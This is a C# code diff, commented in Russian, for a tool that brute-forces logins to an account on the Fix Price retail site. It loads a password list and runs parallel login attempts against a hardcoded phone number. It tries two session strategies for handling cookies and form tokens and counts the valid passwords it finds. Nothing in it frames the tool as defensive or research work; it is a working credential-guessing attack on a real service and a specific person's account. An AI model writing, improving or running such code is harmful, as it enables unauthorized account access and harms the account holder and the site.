@@ -67,8 +67,12 @@ namespace InstagramSaver
 
     class FixPriceBF
     {
-        private List<string> passwords;
-        public int Founded = 0;
+        private List<string> passwords;//сюда пароли попадают из файла
+        public int Founded = 0;//сколько валидных входов
+        /// <summary>
+        /// Загрузка паролей из файла в массив
+        /// </summary>
+        /// <param name="path"></param>
         private void loadPasswords(string path)
         {
             Passwords = new List<string>();
@@ -83,8 +87,8 @@ namespace InstagramSaver
             Console.WriteLine($"Загружено {Passwords.Count} паролей");
         }
 
-        IBrowsingContext context1;
-        readonly Dictionary<string, string> dictonary1 = new Dictionary<string, string>();
+        IBrowsingContext context1;//Контекст для второго способа коннекта с фикспарайсу
+        readonly Dictionary<string, string> dictonary1 = new Dictionary<string, string>();//Данные формы отправки(там лежит токен и прочая хуйня) - тоже для второго способа
 
         public List<string> Passwords { get => passwords; private set => passwords = value; }
 
@@ -92,6 +96,8 @@ namespace InstagramSaver
         {
             loadPasswords(passwordDataPath);
 
+            //инциализация для второго способа
+            //типо заготовка данных пост запроса, там уже будет лежать токен(то есть N попыток коннекта будут в одной ссессии)
             var config = Configuration.Default
 .WithDefaultCookies()
 .WithDefaultLoader();
@@ -117,8 +123,11 @@ namespace InstagramSaver
         }
 
        
-
-        public async Task Brute()
+        /// <summary>
+        /// Пытаемся ломать)
+        /// </summary>
+        /// <returns></returns>
+        public void Brute()
         {
             List<Task<IDocument>> documents = new List<Task<IDocument>>();
             //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
@@ -129,11 +138,19 @@ namespace InstagramSaver
             //Task.WaitAll(documents.ToArray());
             foreach (var password in Passwords)
             {
-                documents.Add(ConnectPlus("+7 (999) 539-67-65", password));
+                documents.Add(Connect("+7 (999) 539-67-65", password));//Первый способ(каждый раз новая сессия)
+                documents.Add(ConnectPlus("+7 (999) 539-67-65", password));//Из под одной сессии
             }
-            Task.WaitAll(documents.ToArray());
+            Task.WaitAll(documents.ToArray());//Ждём пока все задачи(попытки войти) выполняцца
         }
-        public async Task<IDocument> Connect(string login = "+7 (999) 539-67-65", string password = "1488Bambuk)")
+        /// <summary>
+        /// Первый способ
+        /// Каждая попытка коннекта в новой сессии - грузим новые куки и токен
+        /// </summary>
+        /// <param name="login"></param>
+        /// <param name="password"></param>
+        /// <returns></returns>
+        public async Task<IDocument> Connect(string login, string password)
         {
             var config = Configuration.Default
 .WithDefaultCookies()
@@ -165,7 +182,13 @@ namespace InstagramSaver
             return result;
         }
 
-        public async Task<IDocument> ConnectPlus(string login = "+7 (999) 539-67-65", string password = "1488Bambuk)")
+        /// <summary>
+        /// Второй способ - все попытки коннекта в одно сессии (с одними и теме же куками и токеном)
+        /// </summary>
+        /// <param name="login"></param>
+        /// <param name="password"></param>
+        /// <returns></returns>
+        public async Task<IDocument> ConnectPlus(string login, string password)
         {
             var dictonary2 = dictonary1.ToDictionary(entry => entry.Key,
                                                entry => entry.Value);
@@ -187,7 +210,11 @@ namespace InstagramSaver
             }
             return result;
         }
-
+        /// <summary>
+        /// Декодирует юникод
+        /// </summary>
+        /// <param name="text"></param>
+        /// <returns></returns>
         private static string unicodeEncode(string text)
         {
             var rx = new Regex(@"\\u([0-9A-Z]{4})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
@@ -204,7 +231,7 @@ namespace InstagramSaver
             //fixprice.Connect("qwe", "qwe").Wait();
             Stopwatch watch = new Stopwatch();
             watch.Start();
-            fixprice.Brute().Wait();
+            fixprice.Brute();
             watch.Stop();
             Console.WriteLine($"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}");
             Console.WriteLine($"Валидных: {fixprice.Founded}");
